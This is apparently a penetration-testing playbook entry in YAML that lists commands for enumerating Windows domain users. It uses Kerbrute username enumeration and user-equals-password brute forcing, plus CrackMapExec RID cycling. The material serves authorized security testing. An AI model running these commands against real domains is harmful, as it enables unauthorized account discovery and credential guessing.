name: windows_domain_user_enum

info:
  title: Windows Domain User Enumaration
  author: evait security GmbH
  book: internal-pentest
  category: 04_windows_domain
  placeholder: 
    - SMBDomain
    - SMBDomainController
  references:
    - https://github.com/ropnop/kerbrute

content: |
  <h3>Kerbrute</h3>
  <p>Enumarete through Kerberos Pre-Authentication<p>
  <code>kerbrute --dc @@SMBDomainController -d @@SMBDomain userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o kerbrute.txt</code>
  <p>Generate usefull lists (user-list, userpass-list)<p>
  <code>cat kerbrute.txt | grep '@' | cut -d'@' -f1 | cut -d ' ' -f 8 | tr '[:upper:]' '[:lower:]' | sort -u > kerbrute-users.txt</code>
  <code>for i in $(cat kerbrute-users.txt); do echo $i:$i ; done > kerbrute-userpass.txt</code>
  <p>Checking if username is identical with password<p>
  <code>kerbrute --dc @@SMBDomainController -d @@SMBDomain bruteforce kerbrute-userpass.txt -o kerbrute-validcreds.txt</code>
  <h3>RID cycling</h3>
  <code>cme smb @@SMBDomainController --rid-brute</code>